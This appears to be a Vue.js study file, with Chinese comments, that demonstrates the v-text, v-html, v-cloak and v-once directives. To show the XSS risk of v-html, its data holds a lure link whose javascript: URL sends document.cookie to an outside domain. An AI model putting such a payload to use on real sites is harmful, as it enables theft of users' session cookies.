<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        [v-cloak]{
            display: none;
        }
    </style>
</head>
<body>
    <!-- 
        已经学过的指令：
            v-bind:单向绑定解析表达式，可简写为：xxx
            v-model:双向数据绑定
            v-for:遍历数组、对象、字符串
            v-on:绑定事件监听，可简写为@
            v-if:条件渲染（动态控制节点是否存在）        
            v-else:条件渲染（动态控制节点是否存在）
            v-show:动态控制节点是否显示
        v-text:用于绑定文本节点，会将html标签解析为文本节点。
        v-html:用于绑定html节点，会将文本解析为html标签。（注意：在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。）
        v-cloak:用于解决网速慢时，页面展示出未编译的指令的问题。配合css 的 [v-cloak]{display:none;} ，等待实例创建完成，vue实例会删除 v-cloak 属性。
        v-once:渲染后，只渲染一次，数据更新不会更新。
    -->
    <div id="root">
        <p>{{name}}</p>
        <p v-text="name"></p>
        <p v-html="msg"></p>
        <p v-cloak>{{age}}</p>
        <h2>当前的n值是{{n}}</h2>
        <h2 v-once>初始化的n值是{{n}}</h2>
        <button @click="n++">点我n+1</button>
    </div>
    <script src="http://localhost:8082/renren-api/api/delay"></script>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false
    new Vue({
        el: '#root',
        data: {
            name: '胡志荣',
            msg: '<a href=javascript:location.href="https://huzhirong.top?"+document.cookie>兄弟我找到你要的资源了，快来</a>',
            age: 18,
            n:1
        },
    })
</script>
</html>
